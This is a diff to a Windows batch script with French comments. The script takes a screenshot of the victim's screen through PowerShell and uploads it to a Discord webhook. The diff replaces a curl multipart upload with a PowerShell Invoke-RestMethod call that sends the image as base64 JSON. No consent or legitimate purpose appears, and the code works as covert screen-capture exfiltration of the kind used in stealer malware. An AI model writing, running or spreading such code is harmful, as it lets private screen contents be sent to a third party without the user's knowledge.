@@ -10,15 +10,7 @@ set "fileName=%TEMP%\screenshot.png"
 rem Prendre une capture d'écran avec PowerShell et enregistrer l'image
 powershell.exe -Command "$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screenshot.Width, $screenshot.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $screenshot.Size); $bitmap.Save('%fileName%', [System.Drawing.Imaging.ImageFormat]::Png)"
 
-rem Créer la requête HTTP multipart/form-data
-echo Content-Disposition: form-data; name="file"; filename="screenshot.png" > "%TEMP%\request_body.txt"
-echo Content-Type: application/octet-stream >> "%TEMP%\request_body.txt"
-echo. >> "%TEMP%\request_body.txt"
-type "%fileName%" >> "%TEMP%\request_body.txt"
-echo. >> "%TEMP%\request_body.txt"
-echo --boundary-- >> "%TEMP%\request_body.txt"
-
-rem Envoyer la requête à l'URL du webhook Discord avec curl
-curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary" -d @"%TEMP%\request_body.txt" "%webhookUrl%"
+rem Envoyer la capture d'écran au webhook Discord avec PowerShell
+powershell.exe -Command "$webhookUrl = '%webhookUrl%'; $fileName = '%fileName%'; $fileBytes = [System.IO.File]::ReadAllBytes($fileName); $base64File = [System.Convert]::ToBase64String($fileBytes); $json = '{\"content\":\"\",\"embeds\":[{\"title\":\"Capture d\'écran\",\"image\":{\"url\":\"data:image/png;base64,' + $base64File + '\"}}]}'; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType 'application/json'"
 
 echo Capture d'écran envoyée avec succès au webhook Discord.
